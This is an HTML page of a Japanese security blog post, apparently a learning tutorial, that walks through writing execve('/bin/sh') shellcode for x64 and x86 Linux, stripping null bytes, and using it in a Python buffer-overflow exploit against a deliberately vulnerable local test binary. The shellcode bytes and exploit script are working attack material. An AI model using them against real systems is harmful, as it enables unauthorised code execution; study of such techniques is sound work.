@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Figaro&#x27;s Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://figaro-san.github.io/style.css">
+    <link rel="stylesheet" href="https://figaro-san.github.io/color/green.css">
+
+        <link rel="stylesheet" href="https://figaro-san.github.io/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://figaro-san.github.io/font-hack-subset.css">
+
+    <meta name="description" content="">
+
+    <meta property="og:description" content="">
+    <meta property="og:title" content="Figaro's Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://figaro-san.github.io/why-dont-you-write-shellcode/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:title" content="Figaro's Blog">
+    <meta property="twitter:domain" content="figaro-san.github.io">
+    <meta property="twitter:url" content="https://figaro-san.github.io/why-dont-you-write-shellcode/">
+
+        <link rel="shortcut icon" type="image&#x2F;x-icon" href="/butterfly.jpg">
+    
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://figaro-san.github.io" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Figaro&#x27;s Blog
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        
+                <nav class="menu">
+            <ul class="menu__inner">
+                <li class="active"><a href="https://figaro-san.github.io">blog</a></li>
+            
+                <li><a href="https://figaro-san.github.io/tags">tags</a></li>
+            
+                <li><a href="https://figaro-san.github.io/whoami">whoami</a></li>
+            
+                <li><a href="https://figaro-san.github.io/about">about</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://figaro-san.github.io/why-dont-you-write-shellcode/"> > 貴方は何故シェルコードを作成しないのか</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2024-06-25
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/asm/">#Asm</a>&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/c/">#C</a>&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/pwn/">#Pwn</a>&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/tech/">#Tech</a></span>
+    
+
+        <div class="post-content">
+            <h1 id="hazimeni">はじめに</h1>
+<p>タイトルは<strong>ネタ</strong>です。内容はネタじゃありませんが。
+つまりシェルコードを作成の手順を書いていきます。
+基本的には<a href="https://note.com/pien2021/n/n40ec68726989">小物三下</a>さんと<a href="https://inaz2.hatenablog.com/entry/2014/03/13/013056">ももいろテクノロジー</a>さんの記事をなぞっています。</p>
+<h1 id="kai-fa-huan-jing">開発環境</h1>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>OS: EndeavourOS x86_64
+</span><span>Kernel: Linux 6.6.34-1-lts
+</span><span>Shell: bash 5.2.26
+</span><span>Terminal: xfce4-terminal 1.1.3
+</span><span>gcc: 14.1.1
+</span><span>gdb: 14.2 (+pwndbg)
+</span><span>NASM: 2.16.03
+</span><span>ld: 2.42.0
+</span></code></pre>
+<h1 id="sierukodotutehe-tuteren">シェルコードって何って人</h1>
+<p>シェルを起動するコードのことです。Linuxで言えば<code>/bin/sh</code>にあるシェル(Bashとか)を<code>execve</code>システムコールなどによって起動する機械語を指します。なぜ機械語なのかと言うと、シェルコードはBOFなどの脆弱性を通じて、メモリに直接注入する必要があるからです。また機械語はアセンブリと一対一に対応していますから、<code>/bin/sh</code>を<code>execve</code>システムコールで実行するアセンブリコード(実質的にシェルコード)を書けば、あとは自動的に機械語のシェルコードが得られるということです。</p>
+<h1 id="x64-elf-yong-sierukodozuo-cheng">x64(ELF)用シェルコード作成</h1>
+<p>まずは以下のように<code>execve</code>で<code>/bin/sh</code>を呼び出すCプログラムを作成します。</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#888888;">/* shell_exec_x64.c */
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>(</span><span style="color:#8fbfdc;">void</span><span>) {
+</span><span>	</span><span style="color:#8fbfdc;">char </span><span>*argv[] = {</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">/bin/sh</span><span style="color:#556633;">&quot;</span><span>, NULL};
+</span><span>	</span><span style="color:#ffb964;">execve</span><span>(argv[</span><span style="color:#cf6a4c;">0</span><span>], argv, NULL);
+</span><span>}
+</span></code></pre>
+<p>またコンパイルオプションは以下の通りです。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ gcc -static -o shell_exec_x64 shell_exec_x64.c
+</span></code></pre>
+<p>簡単な話、この時点で作成されたシェルを起動するプログラムの、特に<code>execve</code>システムコール直前のレジスタの値(引数)をチェックすることで、シェル起動に必要最低限なアセンブリを記述することができます。</p>
+<p>ではGDBで<code>execve</code>システムコール直前にブレイクポイントを貼り、レジスタの内容を確認してみましょう。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ gdb -q shell_exec_x64
+</span><span>
+</span><span>pwndbg&gt; disassemble execve
+</span><span>Dump of assembler code for function execve:
+</span><span>   0x0000000000410d60 &lt;+0&gt;:     endbr64
+</span><span>   0x0000000000410d64 &lt;+4&gt;:     mov    eax,0x3b
+</span><span>   0x0000000000410d69 &lt;+9&gt;:     syscall
+</span><span>   0x0000000000410d6b &lt;+11&gt;:    cmp    rax,0xfffffffffffff001
+</span><span>   0x0000000000410d71 &lt;+17&gt;:    jae    0x410d74 &lt;execve+20&gt;
+</span><span>   0x0000000000410d73 &lt;+19&gt;:    ret
+</span><span>   0x0000000000410d74 &lt;+20&gt;:    mov    rcx,0xffffffffffffffc0
+</span><span>   0x0000000000410d7b &lt;+27&gt;:    neg    eax
+</span><span>   0x0000000000410d7d &lt;+29&gt;:    mov    DWORD PTR fs:[rcx],eax
+</span><span>   0x0000000000410d80 &lt;+32&gt;:    or     rax,0xffffffffffffffff
+</span><span>   0x0000000000410d84 &lt;+36&gt;:    ret
+</span><span>End of assembler dump.
+</span><span>pwndbg&gt; b *0x0000000000410d69
+</span><span>Breakpoint 1 at 0x410d69
+</span><span>pwndbg&gt; r
+</span><span>Breakpoint 1, 0x0000000000410d69 in execve ()
+</span><span>pwndbg&gt; i r
+</span><span>rax            0x3b                59
+</span><span>rbx            0x1                 1
+</span><span>rcx            0x7fffffffe1d0      140737488347600
+</span><span>rdx            0x0                 0
+</span><span>rsi            0x7fffffffe1d0      140737488347600
+</span><span>rdi            0x479010            4689936
+</span><span>rbp            0x7fffffffe1f0      0x7fffffffe1f0
+</span><span>rsp            0x7fffffffe1c8      0x7fffffffe1c8
+</span><span>r8             0x110               272
+</span><span>r9             0x4                 4
+</span><span>r10            0x478120            4686112
+</span><span>r11            0xf                 15
+</span><span>r12            0x7fffffffe308      140737488347912
+</span><span>r13            0x7fffffffe318      140737488347928
+</span><span>r14            0x49ff28            4849448
+</span><span>r15            0x1                 1
+</span><span>rip            0x410d69            0x410d69 &lt;execve+9&gt;
+</span><span>eflags         0x246               [ PF ZF IF ]
+</span><span>cs             0x33                51
+</span><span>ss             0x2b                43
+</span><span>ds             0x0                 0
+</span><span>es             0x0                 0
+</span><span>fs             0x0                 0
+</span><span>gs             0x0                 0
+</span><span>fs_base        0x4ac380            4899712
+</span><span>gs_base        0x0                 0
+</span></code></pre>
+<p>x64では、引数は順番に<code>rdi, rsi, rdx, ...</code>と取られていきます。また、ソースコード中の<code>execve(argv[0], argv, NULL)</code>より、このシステムコールは３つの引数を取ることが分かります。</p>
+<p>よって<code>rdi</code>が<code>argv[0](/bin/sh)</code>、<code>rsi</code>が<code>argv</code>、<code>rdx</code>が<code>NULL(0)</code>に対応していると分かります。つまり、<code>execve</code>で<code>/bin/sh</code>を呼び出すには、この３つのレジスタをそれぞれ前述した状態にセットする必要があるということです。</p>
+<p>また、x64アセンブリにおけるシステムコールでは<code>rax</code>にシステムコール番号を格納する必要があります。今回は<code>0x3b</code>であるようです。</p>
+<p>また、</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>pwndbg&gt; x/s $rdi
+</span><span>0x479010:       &quot;/bin/sh&quot;
+</span><span>pwndbg&gt; x/10wx $rsi
+</span><span>0x7fffffffe1d0: 0x00479010      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffe1e0: 0xffffe200      0x00007fff      0xfb551f00      0xba63962a
+</span><span>0x7fffffffe1f0: 0xffffe290      0x00007fff
+</span></code></pre>
+<p>より<code>rsi</code>は<code>rdi</code>が持つアドレスとNULL(0)を持っていることも分かります。</p>
+<p>そして、<code>execve</code>システムコールを使用して、シェルを呼び出すアセンブリを書く際に、スタックを利用して引数を管理するなら、作成するスタックの状態は以下のようになるはずです。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>stack(上がアドレス0とすると、下に向かうにつれてアドレスは増えていく)
+</span><span>
+</span><span>------- &lt;- rsi
+</span><span>rdiの値
+</span><span>0
+</span><span>------- &lt;- rdi
+</span><span>hs/nib/
+</span><span>0
+</span></code></pre>
+<p>どういうことかというと、まずはスタックへ<code>/bin/sh</code>とナル終端<code>0</code>をプッシュし、スタックトップを<code>rdi</code>に指させています。これによって<code>rdi</code>が<code>/bin/sh</code>を指していることになります。</p>
+<p>次に<code>rsi</code>を作るために、ナルに相当する<code>0</code>をプッシュします。次に<code>rdi</code>が持つスタックのアドレスをプッシュして、その時点でのスタックトップを<code>rsi</code>に指させることで、</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>rsi = {rdiが持つ/bin/shへのアドレス, NULL}
+</span></code></pre>
+<p>という状態を作り出します。</p>
+<p>(おさらい : 値をプッシュすると、スタックトップを指す<code>rsp</code>は、そのアドレスを減算するため、スタックトップは値がプッシュされたりポップされると変化します)</p>
+<p>最後に<code>rdx</code>を<code>xor</code>でゼロクリアし、<code>rax</code>にシステムコール番号である<code>0x3b</code>を設定すれば<code>syscall</code>でシェルが呼び出せるというわけです。</p>
+<p>では実際に、これをアセンブリで記述してみましょう。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>; shellcode_x64.asm
+</span><span>
+</span><span>global _start
+</span><span>
+</span><span>section .text
+</span><span>_start:
+</span><span>    xor rdx, rdx
+</span><span>    push rdx
+</span><span>    mov rax, 0x68732f6e69622f
+</span><span>    push rax
+</span><span>    mov rdi, rsp
+</span><span>
+</span><span>    push rdx
+</span><span>    push rdi
+</span><span>    mov rsi, rsp
+</span><span>
+</span><span>    xor rax, rax
+</span><span>    mov al, 0x3b
+</span><span>    syscall
+</span></code></pre>
+<p>あとは以下の通りにアセンブルしてリンクします。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ nasm -f elf64 shellcode_x64.asm 
+</span><span>$ ld -o shellcode_x64 shellcode_x64.o
+</span></code></pre>
+<p>バイナリができたら実行してみましょう。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ ./shellcode_x64
+</span><span>sh-5.2$ echo hi
+</span><span>hi
+</span><span>sh-5.2$ exit
+</span><span>exit
+</span><span>$
+</span></code></pre>
+<p>シェルの起動が確認できました。</p>
+<p>あとはシェルコードとしての体裁を整えるだけです。
+(つまりPythonとかPerlとかにコピペして使えるバイナリ表現がほしい。)
+<code>shellcode_x64</code>の中身は、先程記述した<code>shellcode_x64.asm</code>の機械語表現なだけなので、<code>shellcode_x64</code>の中身をそのまま取り出せば、<code>shellcode_x64.asm</code>と同じ処理をしてくれるバイナリが取り出せるというわけです。</p>
+<p>早速取り出してみましょう。
+ももいろテクノロジーさんのシェルスクリプトをお借りして以下のようにコマンドを打ちます。(objdump必須)</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ objdump -M intel -d ./shellcode_x64 | grep &#39;^ &#39; | cut -f2 | perl -pe &#39;s/(\w{2})\s+/\\x\1/g&#39;
+</span></code></pre>
+<p>そうすれば以下のように見慣れたシェルコードを取り出すことができました。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
+</span></code></pre>
+<p>ちょっと<code>objdump</code>で確認してみましょう。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ objdump -D -M intel shellcode_x64
+</span><span>
+</span><span>shellcode_x64:     ファイル形式 elf64-x86-64
+</span><span>
+</span><span>
+</span><span>セクション .text の逆アセンブル:
+</span><span>
+</span><span>0000000000401000 &lt;_start&gt;:
+</span><span>  401000:       48 31 d2                xor    rdx,rdx
+</span><span>  401003:       52                      push   rdx
+</span><span>  401004:       48 b8 2f 62 69 6e 2f    movabs rax,0x68732f6e69622f
+</span><span>  40100b:       73 68 00 
+</span><span>  40100e:       50                      push   rax
+</span><span>  40100f:       48 89 e7                mov    rdi,rsp
+</span><span>  401012:       52                      push   rdx
+</span><span>  401013:       57                      push   rdi
+</span><span>  401014:       48 89 e6                mov    rsi,rsp
+</span><span>  401017:       48 31 c0                xor    rax,rax
+</span><span>  40101a:       b0 3b                   mov    al,0x3b
+</span><span>  40101c:       0f 05                   syscall
+</span></code></pre>
+<p><code>objdump</code>の機械語の出力部分と、シェルスクリプトによる出力は一致しているので、正しそうです。</p>
+<h1 id="narubaitoxue-chu">ナルバイト削除</h1>
+<p>シェルコードはBOFの脆弱性をついて注入するものですが、もしBOF脆弱性を持つ関数が文字列に関する関数であった場合、ナルバイトが存在すると、それが終端文字と判断されて、入力が打ち切られてしまいます。
+つまりシェルコードにナルバイトは存在しないほうが良いのです。</p>
+<p>そして、上記シェルコードにはナルバイトが存在します。よってこれを削除しましょう。
+ナルバイトが存在する箇所は以下です。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>401004:       48 b8 2f 62 69 6e 2f    movabs rax,0x68732f6e69622f
+</span><span>40100b:       73 68 00 
+</span></code></pre>
+<p>これはアセンブリにおいて、<code>rax</code>へ<code>/bin/sh</code>を逆順で与えている命令となりますが、どうやら1バイト足りておらず、ナルバイトが埋め草として使われているようです。この場合<code>/bin/sh</code>を等価である<code>/bin//sh</code>に書き換えることで対処します。</p>
+<p>まずはアセンブリを変更します。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>;shellcode_x64.asm
+</span><span>
+</span><span>global _start
+</span><span>
+</span><span>section .text
+</span><span>_start:
+</span><span>	xor rdx, rdx
+</span><span>	push rdx
+</span><span>	mov rax, 0x68732f2f6e69622f ; /bin//sh
+</span><span>	push rax
+</span><span>	mov rdi, rsp
+</span><span>
+</span><span>	push rdx
+</span><span>	push rdi
+</span><span>	mov rsi, rsp
+</span><span>
+</span><span>	xor rax, rax
+</span><span>	mov al, 0x3b
+</span><span>	syscall
+</span></code></pre>
+<p>次に、アセンブルとリンクをもう一度行って確認してみます。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ nasm -f elf64 shellcode_x64.asm 
+</span><span>$ ld -o shellcode_x64 shellcode_x64.o
+</span><span>$ objdump -D -M intel shellcode_x64
+</span><span>
+</span><span>shellcode_x64:     ファイル形式 elf64-x86-64
+</span><span>
+</span><span>
+</span><span>セクション .text の逆アセンブル:
+</span><span>
+</span><span>0000000000401000 &lt;_start&gt;:
+</span><span>  401000:       48 31 d2                xor    rdx,rdx
+</span><span>  401003:       52                      push   rdx
+</span><span>  401004:       48 b8 2f 62 69 6e 2f    movabs rax,0x68732f2f6e69622f
+</span><span>  40100b:       2f 73 68 
+</span><span>  40100e:       50                      push   rax
+</span><span>  40100f:       48 89 e7                mov    rdi,rsp
+</span><span>  401012:       52                      push   rdx
+</span><span>  401013:       57                      push   rdi
+</span><span>  401014:       48 89 e6                mov    rsi,rsp
+</span><span>  401017:       48 31 c0                xor    rax,rax
+</span><span>  40101a:       b0 3b                   mov    al,0x3b
+</span><span>  40101c:       0f 05                   syscall
+</span></code></pre>
+<p>ナルバイトが消えていることが確認できました。</p>
+<p>これで完成なので、またお借りしたスクリプトで取り出してみましょう。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ objdump -M intel -d ./shellcode_x64 | grep &#39;^ &#39; | cut -f2 | perl -pe &#39;s/(\w{2})\s+/\\x\1/g&#39;
+</span></code></pre>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
+</span></code></pre>
+<p>これがx64(ELF)用のシェルスクリプトとなりました。</p>
+<h1 id="x86-elf-yong-sierukodonozuo-cheng">x86(ELF)用シェルコードの作成</h1>
+<p>32bit用のシェルコードもついでに作成してしまいましょう。</p>
+<p>まずは先程と同じCコードを利用します。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>/* shell_exec_x86.c */
+</span><span>#include &lt;unistd.h&gt;
+</span><span>
+</span><span>int main(void) {
+</span><span>	char *argv[] = {&quot;/bin/sh&quot;, NULL};
+</span><span>	execve(argv[0], argv, NULL);
+</span><span>}
+</span></code></pre>
+<p>コンパイルオプションは以下のとおりです。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ gcc -o shell_exec_x86 shell_exec_x86.c -static -m32
+</span></code></pre>
+<p>GDBで同じように<code>execve</code>をディスアセンブルして見てみます。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>gdb -q shell_exec_x86
+</span><span>
+</span><span>pwndbg&gt; disassemble execve
+</span><span>   0x08054220 &lt;+0&gt;:     push   ebx
+</span><span>   0x08054221 &lt;+1&gt;:     mov    edx,DWORD PTR [esp+0x10]
+</span><span>   0x08054225 &lt;+5&gt;:     mov    ecx,DWORD PTR [esp+0xc]
+</span><span>   0x08054229 &lt;+9&gt;:     mov    ebx,DWORD PTR [esp+0x8]
+</span><span>   0x0805422d &lt;+13&gt;:    mov    eax,0xb
+</span><span>   0x08054232 &lt;+18&gt;:    call   DWORD PTR gs:0x10
+</span><span>   0x08054239 &lt;+25&gt;:    pop    ebx
+</span><span>   0x0805423a &lt;+26&gt;:    cmp    eax,0xfffff001
+</span><span>   0x0805423f &lt;+31&gt;:    jae    0x8058c30 &lt;__syscall_error&gt;
+</span><span>   0x08054245 &lt;+37&gt;:    ret
+</span></code></pre>
+<p>特に</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>    0x08054232 &lt;+18&gt;:    call   DWORD PTR gs:0x10
+</span></code></pre>
+<p>この部分が怪しいので、ここにブレイクポイントを貼って実行し、停止したらレジスタを見てみましょう。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>pwndbg&gt; b *0x08054232
+</span><span>pwndbg&gt; r
+</span><span>
+</span><span>Breakpoint 1, 0x08054232 in execve ()
+</span><span>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+</span><span>────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
+</span><span>*EAX  0xb
+</span><span>*EBX  0x80b4018 ◂— &#39;/bin/sh&#39;
+</span><span>*ECX  0xffffd314 —▸ 0x80b4018 ◂— &#39;/bin/sh&#39;
+</span><span> EDX  0
+</span><span>*EDI  1
+</span><span>*ESI  0x80e6ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0
+</span><span>*EBP  0xffffd328 —▸ 0xffffd438 ◂— 0
+</span><span>*ESP  0xffffd2f8 —▸ 0x80e6ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0
+</span><span>*EIP  0x8054232 (execve+18) ◂— call dword ptr gs:[0x10]
+</span></code></pre>
+<p>pwndbgは親切にも、その時のレジスタの状態を表示してくれます。
+そして、これを見る限り、<code>ebx</code>が<code>/bin/sh</code>こと<code>argv[0]</code>に対応し、<code>ecx</code>が<code>argv</code>こと<code>{"/bin/sh", NULL}</code>に対応し、<code>edx</code>が<code>NULL</code>こと0に対応していると分かります。またシステムコール番号は<code>0xb</code>であるようです。</p>
+<p>あとは前回と同じようにこれをセットし、システムコールを発行すれば良いでしょう。
+(32bitは<code>syscall</code>ではなく<code>int 0x80</code>がシステムコールに対応します。)</p>
+<p>よって以下のようにアセンブリコードを作成します。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>; shellcode_x86.asm
+</span><span>global _start
+</span><span>section .text
+</span><span>
+</span><span>_start:
+</span><span>	xor edx, edx
+</span><span>
+</span><span>	push edx
+</span><span>	push 0x68732f2f
+</span><span>	push 0x6e69622f
+</span><span>	mov ebx, esp
+</span><span>
+</span><span>	push edx
+</span><span>	push ebx
+</span><span>	mov ecx, esp
+</span><span>
+</span><span>	xor eax, eax
+</span><span>	mov al, 0xb
+</span><span>	int 0x80
+</span></code></pre>
+<p>そして、以下のようにシェルを32ビット対応で起動するバイナリを作成、実行してみます。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ nasm -f elf -o shellcode_x86.o shellcode_x86.asm
+</span><span>$ ld -m elf_i386 -o shellcode_x86 shellcode_x86.o
+</span><span>$ ./shellcode_x86
+</span><span>sh-5.2$ echo hi
+</span><span>hi
+</span><span>sh-5.2$ exit
+</span><span>exit
+</span><span>$
+</span></code></pre>
+<p>正しく作成できていそうです。</p>
+<p>ではシェルコードとしての体裁を整えていきましょう。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>objdump -M intel -d shellcode_x86 | grep &#39;^ &#39; | cut -f2 | perl -pe &#39;s/(\w{2})\s+/\\x\1/g&#39;
+</span></code></pre>
+<p>作成されたシェルコードは以下のとおりです。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80
+</span></code></pre>
+<h1 id="sierukodowoshi-sitemiru">シェルコードを試してみる</h1>
+<p>前回投稿した記事において、BOFやカナリアの排除、実行可能スタックなどの脆弱性があるバイナリ<code>vuln</code>に対する攻撃を行っていましたが、その時は<code>pwntools</code>が生成するシェルコードを使用していました。次は自身で作成したシェルコードを利用してみたいと思います。</p>
+<p>具体的には<code>alt.exploit.py</code>を以下のように改造します。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#888888;"># my_shellcode_exploit.py
+</span><span>
+</span><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span style="color:#8fbfdc;">import </span><span>sys
+</span><span style="color:#8fbfdc;">import </span><span>struct
+</span><span>
+</span><span style="color:#8fbfdc;">def </span><span style="color:#fad07a;">gen_payload_file</span><span>(</span><span style="color:#ffb964;">payload</span><span>):
+</span><span>    f = </span><span style="color:#ffb964;">open</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">payload2</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">wb</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>    f.</span><span style="color:#ffb964;">write</span><span>(payload)
+</span><span>    f.</span><span style="color:#ffb964;">close</span><span>()
+</span><span>
+</span><span>nop_sled = </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x90</span><span style="color:#556633;">&#39; </span><span>* </span><span style="color:#cf6a4c;">146
+</span><span>
+</span><span style="color:#888888;"># 26byte
+</span><span>shellcode = </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80</span><span style="color:#556633;">&#39;
+</span><span>
+</span><span style="color:#888888;"># 144 byte = 4 * 36
+</span><span>return_addr = struct.</span><span style="color:#ffb964;">pack</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">I</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#cf6a4c;">0xffffd374</span><span>) * </span><span style="color:#cf6a4c;">36
+</span><span>
+</span><span>payload = nop_sled + shellcode + return_addr
+</span><span>sys.stdout.buffer.</span><span style="color:#ffb964;">write</span><span>(payload)
+</span></code></pre>
+<p>戻りアドレスは適宜変更する必要があります。
+実行してみましょう。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ (python3 my_shellcode_exploit.py; cat) | ./vuln
+</span><span>Overflow me : &amp;buff = 0xffffd374
+</span><span>ls
+</span><span>ls
+</span><span>Makefile        exploit.py  my_shellcode_exploit.py  source.c  vuln
+</span><span>alt_exploit.py  hex         orig_exploit.py          test
+</span><span>ls
+</span><span>Makefile        exploit.py  my_shellcode_exploit.py  source.c  vuln
+</span><span>alt_exploit.py  hex         orig_exploit.py          test
+</span><span>whoami
+</span><span>figaro
+</span><span>echo hi
+</span><span>hi
+</span><span>^C
+</span><span>$
+</span></code></pre>
+<p>しっかり動作しているようです。</p>
+<h1 id="fan-wai-bian">番外編</h1>
+<p>作成したシェルコードからシェルコードのオペコードとそのバイト数を取り出す簡単なシェルスクリプトを作成しました。(objdumpが必要ですが)</p>
+<pre data-lang="bash" style="background-color:#151515;color:#e8e8d3;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#888888;">#!/bin/sh
+</span><span>
+</span><span style="color:#888888;">#xopcodes.sh
+</span><span>
+</span><span style="color:#8fbfdc;">if </span><span>[ ! </span><span style="color:#ffb964;">-e </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">$</span><span style="color:#ffb964;">1</span><span style="color:#556633;">&quot; </span><span>]; </span><span style="color:#8fbfdc;">then
+</span><span>	echo </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">[+] Error : file does not exists</span><span style="color:#556633;">&quot;
+</span><span>	exit 1
+</span><span style="color:#8fbfdc;">fi
+</span><span>
+</span><span style="color:#ffb964;">opcodes</span><span>=</span><span style="color:#99ad6a;">$(</span><span style="color:#ffb964;">objdump -M</span><span style="color:#99ad6a;"> intel</span><span style="color:#ffb964;"> -d </span><span style="color:#99ad6a;">$</span><span style="color:#ffb964;">1 </span><span style="color:#99ad6a;">| </span><span style="color:#ffb964;">grep </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">^ </span><span style="color:#556633;">&#39; </span><span style="color:#99ad6a;">| </span><span style="color:#ffb964;">cut -f2 </span><span style="color:#99ad6a;">| </span><span style="color:#ffb964;">perl -pe </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">s/(\w{2})\s+/\\x\1/g</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">)
+</span><span style="color:#ffb964;">oplen</span><span>=</span><span style="color:#99ad6a;">$(echo </span><span style="color:#ffb964;">-n </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">$</span><span style="color:#ffb964;">opcodes</span><span style="color:#556633;">&quot; </span><span style="color:#99ad6a;">| </span><span style="color:#ffb964;">grep -o </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\\x</span><span style="color:#556633;">&#39; </span><span style="color:#99ad6a;">| </span><span style="color:#ffb964;">wc -l</span><span style="color:#99ad6a;">)
+</span><span>
+</span><span>echo </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">opcodes : $</span><span style="color:#ffb964;">opcodes</span><span style="color:#556633;">&quot;
+</span><span>echo </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">length  : $</span><span style="color:#ffb964;">oplen</span><span style="color:#556633;">&quot;
+</span></code></pre>
+<p>機械語を取り出すところまでは同じですが、さらにバイト数を数える処理を追加してシェルスクリプトとしたものです。</p>
+<h1 id="zui-hou-ni">最後に</h1>
+<p>もっと小さいシェルコードの作成などにも挑戦してみたいところです。何かありましたらご指摘ください。</p>
+
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Thanks for reading! Read other posts?</span>
+                    <hr />
+                </div>
+                <div class="pagination__buttons">
+                        <span class="button previous">
+                            <a href="https://figaro-san.github.io/seccon-beginners-ctf-2024/">
+                                <span class="button__icon">←</span>&nbsp;
+                                <span class="button__text">SECCON Beginners CTF 敗戦記</span>
+                            </a>
+                        </span>
+                    
+                    
+                        <span class="button next">
+                            <a href="https://figaro-san.github.io/fun-for-me/">
+                                <span class="button__text">楽しいこと</span>&nbsp;
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    </div>
+            </div>
+        
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2025
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
